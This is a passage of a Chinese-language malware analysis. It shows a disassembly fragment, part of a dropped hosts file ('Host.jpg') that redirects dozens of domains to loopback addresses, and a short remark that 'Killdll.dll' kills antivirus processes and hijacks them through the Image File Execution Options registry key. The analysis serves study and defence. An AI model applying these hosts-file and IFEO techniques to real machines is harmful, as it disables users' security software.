00400E7F   |.  FF15 30044000   |call  dword ptr [<&KERNEL32.WriteFile>] ; \WriteFile  

00400E85   |.  8945 0C         |mov  [arg.2], eax  

00400E88   |.  33C0            |xor  eax, eax  

00400E8A   |.  3B45 FC         |cmp  eax, [local.1]  

00400E8D   |.  1BC0            |sbb  eax, eax  

00400E8F   |.  F7D8            |neg  eax  

00400E91   |.  85C7            |test edi, eax  

00400E93   |.^  75 BF           \jnz  short 00400E54  

00400E95   |.  56              push  esi                             ; /pFileSizeHigh  

00400E96   |.  53              push  ebx                             ; |hFile  

00400E97   |.  FF15 2C044000   call  dword ptr [<&KERNEL32.GetFileSize>>; \GetFileSize
```

`--------------------------------------------------------------------------------------------------`

`Host.jpg` 文件内容为:(截取部分)

```
127.0.0.1       v.onondown.com.cn  

127.0.0.2       ymsdasdw1.cn  

127.0.0.3       h96b.info  

127.0.0.0       fuck.zttwp.cn  

127.0.0.0       www.hackerbf.cn  

127.0.0.0       zzz.2008wyt.net  

127.1.1.1       aiyyw.com  

127.0.0.1       858656.com  

127.0.0.1       203.110.168.233:80  

127.0.0.1       3.joppnqq.com  

127.0.0.1       203.110.168.221:80  

127.0.0.1       363xx.com
```



127.0.0.1       `www1.ip10086.com`

127.0.0.1       `97725.com`

127.0.0.1       `9gg.biz`

127.0.0.1       `www.9000music.com`

127.0.0.1       `test.591jx.com`

127.0.0.1       `a.topxxxx.cn`

127.0.0.1       `picon.chinaren.com`

127.0.0.1       `www.5566.net`

127.0.0.1       `p.qqkx.com`

127.0.0.1       `news.netandtv.com`

127.0.0.1       `z.neter888.cn`

127.0.0.1       `b.myblank.cn`

127.0.0.1       `wvw.wokutu.com`

127.0.0.1       `unionch.qyule.com`

127.0.0.1       `www.qyule.com`

127.0.0.1       `it.itjc.cn`

127.0.0.1       `www.linkwww.com`

127.0.0.1       `vod.kaicn.com`

127.0.0.1       `www.tx8688.com`

127.0.0.1       `b.neter888.cn`

127.0.0.1       `promote.huanqiu.com`

127.0.0.1       `www.huanqiu.com`

127.0.0.1       `www.haokanla.com`

127.0.0.1       `play.unionsky.cn`

127.0.0.1       `www.52v.com`

127.0.0.1       `www.gghka.cn`

127.0.0.1       `icon.ajiang.net`

127.0.0.1       `new.ete.cn`

127.0.0.1       `www.stiae.cn`

127.0.0.1       `o.neter888.cn`

还有 `Killdll.dll` 文件不详细分析了,结束一些常见的杀毒软件进程,修改 `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`,劫持一大堆杀软件,完~
